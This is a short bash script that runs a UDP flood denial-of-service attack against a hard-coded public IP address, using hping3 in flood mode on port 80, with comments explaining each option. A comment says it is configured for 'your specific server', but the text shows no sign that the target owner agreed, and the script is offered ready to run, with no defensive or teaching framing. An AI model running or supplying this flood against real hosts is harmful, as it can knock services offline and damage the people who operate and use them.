#!/bin/bash

# Configured to target your specific server.
TARGET="65.109.132.110"

echo "[*] Starting UDP flood attack on $TARGET..."
echo "[*] This requires hping3. Run 'sudo apt install hping3' if not found."
# --flood: send packets as fast as possible
# --udp: use UDP protocol
# -p 80: target port 80
sudo hping3 --flood --udp -p 80 $TARGET